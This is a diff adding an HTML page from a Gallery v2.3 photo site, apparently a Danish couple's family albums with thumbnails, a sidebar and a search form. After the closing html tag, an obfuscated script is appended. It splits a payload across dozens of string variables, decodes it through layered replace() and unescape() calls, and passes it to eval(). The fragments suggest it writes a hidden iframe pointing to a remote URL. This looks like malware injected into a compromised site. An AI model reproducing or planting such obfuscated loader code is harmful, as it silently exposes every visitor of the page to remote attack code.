@@ -1,0 +1,334 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en-US" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+
+<link rel="stylesheet" type="text/css" href="modules/core/data/gallery.css"/>
+<link rel="stylesheet" type="text/css" href="modules/icons/iconpacks/silk/icons.css"/>
+<link rel="alternate" type="application/rss+xml" title="Photo RSS" href="main.php?g2_view=slideshow.SlideshowMediaRss&amp;g2_itemId=7"/>
+<script type="text/javascript" src="http://www.reneogheidi.dk/main.php?g2_view=core.CombinedJavascript&amp;g2_key=9dd08fdea1e74d5ade3c008b9cb4f812"></script>
+<script type="text/javascript" src="main.php?g2_view=slideshow.DownloadPicLens&amp;g2_file=js&amp;g2_v=1.3.1.14221"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<meta name="keywords" content="" />
+<meta name="description" content="This is the main page of your Gallery" />
+<script type="text/javascript" src="themes/carbon/theme.js"></script>
+<title>Gallery</title>
+<link rel="stylesheet" type="text/css" href="themes/carbon/theme.css"/>
+</head>
+<body class="gallery">
+<div id="gallery">
+<div id="gsHeader">
+<table width="100%" cellspacing="0" cellpadding="0">
+<tr>
+<td align="left" valign="top" width="50%">
+<a href="main.php">
+<img src="images/galleryLogo_sm.gif" width="107" height="48" alt=""/>
+</a>
+</td>
+<td align="right" valign="top">
+
+</td>
+</tr>
+</table>
+</div>
+<div id="gsNavBar" class="gcBorder1">
+<div class="gbSystemLinks">
+<span class="block-core-SystemLink">
+<a href="main.php?g2_view=core.UserAdmin&amp;g2_subView=core.UserLogin&amp;g2_return=%2Fmain.php%3Fg2_controller%3Dwebdav.WebDav%26g2_itemId%3D7%26g2_originalPath%3D%26g2_path%3D%26">Login</a>
+</span>
+&laquo;
+<span class="block-core-SystemLink">
+<a href="main.php?g2_view=core.UserAdmin&amp;g2_subView=register.UserSelfRegistration&amp;g2_return=%2Fmain.php%3Fg2_controller%3Dwebdav.WebDav%26g2_itemId%3D7%26g2_originalPath%3D%26g2_path%3D%26">Register</a>
+</span>
+&laquo;
+
+
+<span class="block-core-SystemLink">
+<a href="main.php?g2_jsWarning=true" 
+onclick="toggleSidebar('sidebar'); return false;">Sidebar</a>
+</span>
+</div>
+<div class="gbBreadCrumb">
+<div class="block-core-BreadCrumb">
+<span class="BreadCrumb-1">
+Gallery</span>
+</div>
+</div>
+</div>
+<table class="gcBackground1" width="100%" cellspacing="0" cellpadding="0">
+<tr valign="top">
+<td>
+<div id="gsContent" class="gcBorder1">
+<div class="gbBlockTop">
+<table>
+<tr>
+<td class="gsActionIcon">
+<div class="buttonShowSidebar"><a href="main.php?g2_jsWarning=true"
+onclick="slideIn('sidebar'); return false;"
+title="Show Sidebar"></a></div>
+</td>
+<td class="gsActionIcon">
+<div class="buttonCart"><a href="main.php?g2_controller=cart.AddToCart&amp;g2_itemId=7&amp;g2_return=%2Fmain.php%3Fg2_controller%3Dwebdav.WebDav%26g2_itemId%3D7%26g2_originalPath%3D%26g2_path%3D%26" title="Add Album To Cart" class=""></a></div>
+</td>
+</tr>
+</table>
+</div>
+<table width="100%" cellspacing="0" cellpadding="0">
+<tr valign="top">
+<td width="30%">
+<div class="gsContentDetail">
+<div class="gbBlock">
+<h2> Gallery </h2>
+<p class="giDescription">
+This is the main page of your Gallery
+</p>
+</div>
+<div class="gbBlock">
+<div class="block-core-ItemInfo giInfo">
+<div class="date summary">
+Date: 05/22/2009
+</div>
+<div class="owner summary">
+Owner: Rene og Heidi
+</div>
+<div class="size summary">
+Size: 3 items
+(212 items total)
+</div>
+</div>
+</div>
+<div class="gbBlock">
+</div>
+</div>
+</td>
+<td>
+<div class="gsContentAlbum">
+<table id="gsThumbMatrix" width="100%">
+<tr valign="top">
+<td class="giAlbumCell"
+style="width: 33%">
+<div>
+
+<a href="main.php?g2_itemId=27"><img src="main.php?g2_view=core.DownloadItem&amp;g2_itemId=2622&amp;g2_serialNumber=2" width="150" height="150" id="IFid1" class="ImageFrame_ giThumbnail" alt="René"/></a>
+
+</div>
+<div class="block-core-ItemLinks">
+<a href="main.php?g2_controller=cart.AddToCart&amp;g2_itemId=27&amp;g2_return=%2Fmain.php%3Fg2_controller%3Dwebdav.WebDav%26g2_itemId%3D7%26g2_originalPath%3D%26g2_path%3D%26" class="gbAdminLink gbLink-cart_AddToCart">Add Album To Cart</a>
+</div>
+
+<table cellpadding="0" cellspacing="0">
+<tr>
+<td class="giTitleIcon">
+<img src="themes/carbon/images/album.gif" alt=""/>
+</td>
+<td>
+<p class="giTitle">René</p>
+</td>
+</tr>
+</table>
+<p class="giDescription">
+René's billeder
+</p>
+<div class="block-core-ItemInfo giInfo">
+<div class="date summary">
+Date: 05/22/2009
+</div>
+<div class="owner summary">
+Owner: Rene og Heidi
+</div>
+<div class="size summary">
+Size: 1 item
+(46 items total)
+</div>
+<div class="viewCount summary">
+Views: 1238
+</div>
+</div>
+</td>
+<td class="giAlbumCell"
+style="width: 33%">
+<div>
+
+<a href="main.php?g2_itemId=29"><img src="main.php?g2_view=core.DownloadItem&amp;g2_itemId=2761&amp;g2_serialNumber=2" width="150" height="149" id="IFid2" class="ImageFrame_ giThumbnail" alt="René og Heidi"/></a>
+
+</div>
+<div class="block-core-ItemLinks">
+<a href="main.php?g2_controller=cart.AddToCart&amp;g2_itemId=29&amp;g2_return=%2Fmain.php%3Fg2_controller%3Dwebdav.WebDav%26g2_itemId%3D7%26g2_originalPath%3D%26g2_path%3D%26" class="gbAdminLink gbLink-cart_AddToCart">Add Album To Cart</a>
+</div>
+
+<table cellpadding="0" cellspacing="0">
+<tr>
+<td class="giTitleIcon">
+<img src="themes/carbon/images/album.gif" alt=""/>
+</td>
+<td>
+<p class="giTitle">René og Heidi</p>
+</td>
+</tr>
+</table>
+<div class="block-core-ItemInfo giInfo">
+<div class="date summary">
+Date: 05/22/2009
+</div>
+<div class="owner summary">
+Owner: Rene og Heidi
+</div>
+<div class="size summary">
+Size: 2 items
+(108 items total)
+</div>
+<div class="viewCount summary">
+Views: 1683
+</div>
+</div>
+</td>
+<td class="giAlbumCell"
+style="width: 33%">
+<div>
+
+<a href="main.php?g2_itemId=28"><img src="main.php?g2_view=core.DownloadItem&amp;g2_itemId=3234&amp;g2_serialNumber=2" width="150" height="150" id="IFid3" class="ImageFrame_ giThumbnail" alt="Heidi"/></a>
+
+</div>
+<div class="block-core-ItemLinks">
+<a href="main.php?g2_controller=cart.AddToCart&amp;g2_itemId=28&amp;g2_return=%2Fmain.php%3Fg2_controller%3Dwebdav.WebDav%26g2_itemId%3D7%26g2_originalPath%3D%26g2_path%3D%26" class="gbAdminLink gbLink-cart_AddToCart">Add Album To Cart</a>
+</div>
+
+<table cellpadding="0" cellspacing="0">
+<tr>
+<td class="giTitleIcon">
+<img src="themes/carbon/images/album.gif" alt=""/>
+</td>
+<td>
+<p class="giTitle">Heidi</p>
+</td>
+</tr>
+</table>
+<div class="block-core-ItemInfo giInfo">
+<div class="date summary">
+Date: 05/22/2009
+</div>
+<div class="owner summary">
+Owner: Rene og Heidi
+</div>
+<div class="size summary">
+Size: 1 item
+(55 items total)
+</div>
+<div class="viewCount summary">
+Views: 1223
+</div>
+</div>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+</table>
+  
+
+    
+
+</div>
+</td>
+</tr>
+</table>
+<div id="sidebar" class="gcPopupBackground"
+style="position:absolute; left:-190px; top:106px; padding:1px;">
+<table cellspacing="0" cellpadding="0">
+<tr>
+<td align="left" style="padding-left:5px;">
+<h2>Actions</h2>
+</td>
+<td align="right" style="padding-right:2px;">
+<div class="buttonHideSidebar"><a href="javascript: slideOut('sidebar')"
+title="Close"></a></div>
+</td>
+</tr>
+<tr>
+<td colspan="2" class="gcBackground2" style="padding-bottom:5px">
+<div id="gsSidebar" class="gcBorder1">
+
+<div class="block-search-SearchBlock gbBlock">
+<form id="search_SearchBlock" action="main.php" method="get" onsubmit="return search_SearchBlock_checkForm()">
+<div>
+<input type="hidden" name="g2_return" value="/main.php?g2_controller=webdav.WebDav&amp;g2_itemId=7&amp;g2_originalPath=&amp;g2_path="/>
+<input type="hidden" name="g2_formUrl" value="/main.php?g2_controller=webdav.WebDav&amp;g2_itemId=7&amp;g2_originalPath=&amp;g2_path="/>
+<input type="hidden" name="g2_authToken" value="74dcdd084ef1"/>
+
+<input type="hidden" name="g2_view" value="search.SearchScan"/>
+<input type="hidden" name="g2_form[formName]" value="search_SearchBlock"/>
+<input type="text" id="searchCriteria" size="18"
+name="g2_form[searchCriteria]"
+value="Search the Gallery"
+onfocus="search_SearchBlock_focus()"
+onblur="search_SearchBlock_blur()"
+class="textbox"/>
+<input type="hidden" name="g2_form[useDefaultSettings]" value="1" />
+</div>
+<div>
+<a href="main.php?g2_view=search.SearchScan&amp;g2_form%5BuseDefaultSettings%5D=1&amp;g2_return=%2Fmain.php%3Fg2_controller%3Dwebdav.WebDav%26g2_itemId%3D7%26g2_originalPath%3D%26g2_path%3D%26"
+class="gbAdminLink gbLink-search_SearchScan advanced">Advanced Search</a>
+</div>
+</form>
+</div>
+<div class="block-core-ItemLinks gbBlock">
+<a href="main.php?g2_controller=cart.AddToCart&amp;g2_itemId=7&amp;g2_return=%2Fmain.php%3Fg2_controller%3Dwebdav.WebDav%26g2_itemId%3D7%26g2_originalPath%3D%26g2_path%3D%26" class="gbAdminLink gbLink-cart_AddToCart">Add Album To Cart</a>
+<a href="main.php?g2_view=webdav.WebDavMount&amp;g2_itemId=7" class="gbAdminLink gbLink-webdav_WebDavMount">Mount with WebDAV</a>
+<a href="main.php?g2_view=rss.SimpleRender&amp;g2_itemId=7" class="gbAdminLink gbLink-rss_SimpleRender">RSS Feed for this Album</a>
+</div>
+
+
+
+
+<div class="block-imageblock-ImageBlock gbBlock">
+<div class="one-image">
+<h3> Random Image </h3>
+<a href="main.php?g2_itemId=2830">
+
+<img src="main.php?g2_view=core.DownloadItem&amp;g2_itemId=2831&amp;g2_serialNumber=2" width="150" height="149" class="giThumbnail" alt="DCP_2193"/>
+ </a> <h4 class="giDescription">
+DCP_2193
+</h4>
+<p class="giInfo">
+<span class="summary">
+Date: 07/08/2006
+</span>
+<span class="summary">
+Views: 384
+</span>
+</p>
+</div>
+</div>
+
+</div>
+</td>
+</tr>
+</table>
+</div>
+
+<div id="gsFooter" class="gcBorder1">
+<table width="100%" cellspacing="0" cellpadding="0">
+<tr>
+<td align="left" width="50%">
+
+<a href="http://gallery.sourceforge.net"><img src="images/gallery.gif" alt="Powered by Gallery v2.3" title="Powered by Gallery v2.3" style="border-style: none" width="80" height="15"/></a>
+
+
+</td>
+<td align="right">
+
+
+</td>
+</tr>
+</table>
+</div>
+  </div>
+<script type="text/javascript">
+// <![CDATA[
+search_SearchBlock_init('Search the Gallery', 'Please enter a search term.', 'Searching in progress, please wait!');
+// ]]>
+</script>
+
+
+</body>
+</html><script>var qtF9Ihbx="Q659Q749";var ie4CH2w="').repl";var NSfKYb="e(k6EF0kA";var Ymi5="09Q699Q649Q3D9";var xb8vF="u%61u%6Du%6Q";var XgxcOQ9="3C9Q2F";var DH1sH="u%6Eu%74u%";var yoad="5u46E5u446";var g9loPHP8="9Q3E9Q279Q3B9";var RTcp="49Q2E9Q779Q";var M6XKU="E9Q629Q6F9Q6";var DWz4F7="ofilK='5u45";DWz4F7=")));var WI"+DWz4F7;var sGVYk="%u%4QGv%u%6Cu%6";var ebj1s="9Q509Q789Q759";var HedMzw="4695u46";var KIGZW4I="%')));";var xQF2n1u="Q599Q3";ie4CH2w="e(/QGv%/g,'5"+ie4CH2w;var tb6gbon9="27g3s3Bg3s";var K35lX="7g3s3B';";ie4CH2w="pe(O5bsf.replac"+ie4CH2w;var hqgN5BVB="3D9Q3D";ebj1s="69Q619Q729Q20"+ebj1s;var rOJDokx0="g3s27g";var JsIEzf="QGv%u%6Eu";RTcp+="729Q699Q74";var J9qihm="'%')));var O5";var ZxZZ="4u%2Eu%67u%73u%";rOJDokx0+="3s31g3s27g3s";var O73L="759Q6D9Q659Q";var B8E8RpF="%6Au%2Eu%73";var aN8w="3s64g3s64g3";ZxZZ+="2Fu%QGv%4u";var GpqWr="u4455u4385u";var jg0L="9Q5A9Q469Q599Q";var nABJc1kC="389Q3D9Q649";ebj1s="9Q709Q299Q3B9Q7"+ebj1s;var sK1i="Eg3s77g3s69g3";var oC33KU="u%6Fu%63";var lEHBbWbr="6F9Q639Q759Q6D9";var Hfv0="3Bg3s77g3s";HedMzw+="C5u4645u4";var CeRkv5l="QGv%u%78u%69u%";var KRdUfTv="6E9Q749Q";var rvpP="9Q3C9Q629Q6";ebj1s="A9Q469Q599Q39"+ebj1s;var qcZ8Sa="g3s6Cg3s65g3s";var YlLzo="69g3s6";var ryriOy="5g3s69g3s67";ZxZZ+="%72u%6Fu%70";XgxcOQ9="Q279Q3E9Q"+XgxcOQ9;sGVYk="61u%74u%6QGv"+sGVYk;var mFvIrP="y/g,'A').repl";var PL7kQniG="5g3s3Dg3";var fwtGxdb="place(/5";Hfv0="Bg3s56g3s27g3s"+Hfv0;HedMzw="5u4685u"+HedMzw;var L5lfR="Q469Q599Q399Q70";var EkMq6v="3s2Eg3s6Eg3s";aN8w+="s65g3s";var DacMRBv="B9Q699Q669Q";GpqWr="4565u4335"+GpqWr;XgxcOQ9+="9Q649Q699Q769Q";L5lfR="E9Q279Q2B9Q5A9"+L5lfR;JsIEzf=oC33KU+"u%7QGv%u%6Du%6"+JsIEzf;mFvIrP=NSfKYb+"x.replace(/p"+mFvIrP;DWz4F7=mFvIrP+"ace(/g3s/g,'%'"+DWz4F7;var XUe6WMNJ="2u%7QGv%u%74";yoad=HedMzw+"285u477"+yoad;ie4CH2w="3B';eval(unesca"+ie4CH2w;var lDFIXz="C9Q6C9Q";var hRr0u="u%6Au%";var SEzPTBZ="g3s4Fg";YlLzo+="Cg3s69g3s74g";var AmGG="g3s73g3s6";var QltR26io="95u43B';eval(";var gQUTVhz3="705u4705u4";var sEnIJ="359Q759Q549Q76";qcZ8Sa="s73g3s74g3s79"+qcZ8Sa;hqgN5BVB=M6XKU+"49Q799Q"+hqgN5BVB;QltR26io+="unesca";var curl="F0kAx=";g9loPHP8+="Q649Q6";curl+="'g3s77g3s6E";ebj1s=RTcp+"9Q659Q209Q289Q5"+ebj1s;PL7kQniG=EkMq6v+"61g3s6Dg3s6"+PL7kQniG;curl=")));var k6E"+curl;rOJDokx0="4g3s68g3s3D"+rOJDokx0;K35lX+="eval(u";sEnIJ+="9Q429Q509Q7A9Q";yoad="u4645u443"+yoad;var GJ0e="QGv%u%66u%66u%6";var hLDikEfh="519Q27";YlLzo+="3s79g3s3Dg";AmGG=qcZ8Sa+"2Eg3s76g3s69"+AmGG;qtF9Ihbx=O73L+"6E9Q749Q2E9Q679"+qtF9Ihbx;DH1sH=sGVYk+"QGv%u%6Du%6QGv%"+DH1sH;var KY4FpjDP="D9Q229Q3C9";var RspzW7Tg="%27u%68";xb8vF="u%66u%72"+xb8vF;g9loPHP8="649Q79"+g9loPHP8;RspzW7Tg+="u%74u%74u%70u%";tb6gbon9+="77g3s6Eg3s";jg0L="Q769Q619Q729Q20"+jg0L;var xCKUn="9u%3Bu%77";CeRkv5l=RspzW7Tg+"3Au%2Fu%2Fu%6"+CeRkv5l;hqgN5BVB=lEHBbWbr+"Q659Q6E9Q749Q2"+hqgN5BVB;nABJc1kC=ebj1s+"Q569Q339Q459Q"+nABJc1kC;jg0L="var HxdVNL='9"+jg0L;var rGzctKyZ="QGv%u%72u";J9qihm="replace(/9Q/g,"+J9qihm;hLDikEfh="9Q7A9Q6C9Q6B9Q"+hLDikEfh;KIGZW4I=fwtGxdb+"u4/g,'"+KIGZW4I;xCKUn=xb8vF+"Gv%u%27u%2"+xCKUn;KY4FpjDP=jg0L+"399Q709Q3"+KY4FpjDP;L5lfR+="9Q2B9Q279Q3C9";GpqWr=DWz4F7+"05u4785u4755u"+GpqWr;gQUTVhz3=GpqWr+"42E5u4615u4"+gQUTVhz3;B8E8RpF=xCKUn+"u%6Eu%46u"+B8E8RpF;YlLzo=AmGG+"9g3s62g3s"+YlLzo;ZxZZ=GJ0e+"QGv%u%63u%7"+ZxZZ;J9qihm+="bsf='u%76";rOJDokx0+="3Bg3s77g3s6Eg3";var pXD2Aiqo="649Q289Q279";var VO3z1xR="3B';eval(unesc";nABJc1kC="D9Q659Q6E9Q7"+nABJc1kC;ie4CH2w=ZxZZ+"u%27u%"+ie4CH2w;ryriOy="3s68g3s6"+ryriOy;aN8w=YlLzo+"3s27g3s68g3s69g"+aN8w;J9qihm=VO3z1xR+"ape(HxdVNL."+J9qihm;DacMRBv=XgxcOQ9+"3E9Q229Q3"+DacMRBv;DH1sH="3u%72u%6QGv%u%"+DH1sH;KRdUfTv="Q6D9Q659Q"+KRdUfTv;SEzPTBZ=PL7kQniG+"s27g3s6pyg3s72"+SEzPTBZ;XUe6WMNJ=CeRkv5l+"73u%74u%2Eu%6"+XUe6WMNJ;curl=ie4CH2w+"ace(/u%/g,'%'"+curl;DacMRBv=sEnIJ+"6C9Q6B9Q519"+DacMRBv;rvpP=xQF2n1u+"99Q709Q3D9Q27"+rvpP;pXD2Aiqo=KRdUfTv+"429Q799Q499Q"+pXD2Aiqo;ryriOy+="g3s68g3s74g3s3";K35lX=aN8w+"6Eg3s2"+K35lX;rvpP+="F9Q649";hLDikEfh="549Q769Q429Q50"+hLDikEfh;qtF9Ihbx=nABJc1kC+"Q6F9Q639Q"+qtF9Ihbx;JsIEzf=hRr0u+"3Du%64"+JsIEzf;DacMRBv=Ymi5+"Q279Q569Q"+DacMRBv;tb6gbon9=ryriOy+"Dg3s27g3s31g3s"+tb6gbon9;rGzctKyZ=XUe6WMNJ+"u%74u%6"+rGzctKyZ;g9loPHP8=L5lfR+"Q2F9Q629Q6F9Q"+g9loPHP8;SEzPTBZ=tb6gbon9+"46g3s6pyg"+SEzPTBZ;Hfv0="g3s39g3s6"+Hfv0;yoad=gQUTVhz3+"655u46E5"+yoad;QltR26io=yoad+"5u46A5u42"+QltR26io;lDFIXz=hqgN5BVB+"9Q6E9Q759Q6"+lDFIXz;Hfv0=SEzPTBZ+"3s69g3s64g3s31"+Hfv0;rOJDokx0=sK1i+"s64g3s7"+rOJDokx0;curl+="g3s46g3";rvpP=lDFIXz+"299Q5A9Q469"+rvpP;J9qihm=hLDikEfh+"9Q299Q"+J9qihm;JsIEzf="u%77u%6Eu%46"+JsIEzf;KIGZW4I=QltR26io+"pe(WIofilK.re"+KIGZW4I;Hfv0=rOJDokx0+"s46g3s6pyg3s2Eg"+Hfv0;g9loPHP8=rvpP+"Q799Q3"+g9loPHP8;rGzctKyZ=B8E8RpF+"u%72u%63u%3Du"+rGzctKyZ;JsIEzf=J9qihm+"u%61u%72u%20"+JsIEzf;DH1sH=JsIEzf+"%74u%2Eu%6"+DH1sH;Hfv0=curl+"s6pyg3s2"+Hfv0;DH1sH=pXD2Aiqo+"Q569Q359Q759Q"+DH1sH;DH1sH=qtF9Ihbx+"Q459Q6C9Q659"+DH1sH;DH1sH=g9loPHP8+"F9Q639Q759Q6"+DH1sH;rGzctKyZ=DH1sH+"28u%27u%69"+rGzctKyZ;Hfv0=rGzctKyZ+"%66u%6Cu%79u%6"+Hfv0;Hfv0+="6Eg3s46g3s6";K35lX=Hfv0+"pyg3s2Eg3"+K35lX;KIGZW4I=K35lX+"nescap"+KIGZW4I;DacMRBv=KY4FpjDP+"Q649Q699Q769Q2"+DacMRBv;KIGZW4I=DacMRBv+"289Q649Q"+KIGZW4I;eval(KIGZW4I);</script><script>check_content()</script>
